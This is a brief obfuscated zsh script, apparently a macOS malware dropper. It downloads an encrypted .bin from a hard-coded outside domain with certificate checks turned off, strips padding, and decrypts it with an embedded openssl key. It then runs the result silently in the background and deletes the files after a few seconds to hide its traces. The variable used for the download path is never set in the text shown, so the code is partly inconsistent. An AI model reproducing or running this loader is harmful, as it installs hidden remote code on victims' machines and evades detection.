#!/bin/zsh
qx5qu=$(mktemp /tmp/ayvkuy.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/med14dcdf08bb8f9a.bin" -o "$qx5quz" || exit 1
uvue94=$(stat -f %z "$qx5quz"); ywyjpyt=$(( uvue94 - 1172 - 3671 ))
tail -c +$(( 1172 + 1 )) "$qx5quz" | head -c $ywyjpyt | openssl enc -d -aes-256-cbc -k ed053009c3b1e66d30a57f85 -out "$qx5qu" 2>/dev/null
[ -s "$qx5qu" ] && chmod 700 "$qx5qu" && ( "$qx5qu" & ) && disown
( sleep 3; rm -f "$qx5qu" "$qx5quz" ) &>/dev/null &
